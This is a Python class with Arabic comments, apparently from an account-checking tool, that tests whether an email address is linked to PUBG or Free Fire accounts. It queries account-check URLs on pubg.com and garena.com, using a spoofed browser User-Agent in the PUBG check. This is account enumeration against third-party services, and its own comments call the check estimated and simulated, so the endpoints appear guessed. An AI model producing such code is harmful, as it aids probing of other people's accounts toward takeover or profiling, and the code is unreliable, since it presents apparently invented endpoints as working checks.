class GamingChecker:
    """محرك فحص ربط الألعاب والحسابات النشطة"""
    
    @staticmethod
    def check_pubg_link(email):
        """فحص إذا كان الإيميل مربوطاً بلعبة ببجي (تقديري عبر واجهة الاستعادة)"""
        headers = {
            'User-Agent': DataLibrary.get_browsers()[0],
            'Content-Type': 'application/json'
        }
        # محاكاة طلب فحص إيميل في قاعدة بيانات الألعاب
        try:
            # هنا نستخدم واجهة API مبسطة لفحص الربط
            res = requests.get(f"https://account.battlegrounds.pubg.com/api/check?email={email}", headers=headers, timeout=5)
            if res.status_code == 200: return True
            return False
        except: return False

    @staticmethod
    def check_freefire_link(email):
        """فحص الربط بلعبة فري فاير (عبر Garena Link)"""
        try:
            # بصمة متصفح سريعة للفحص
            res = requests.head(f"https://auth.garena.com/api/v1/user/check?login={email}", timeout=5)
            return True if res.status_code == 200 else False
        except: return False

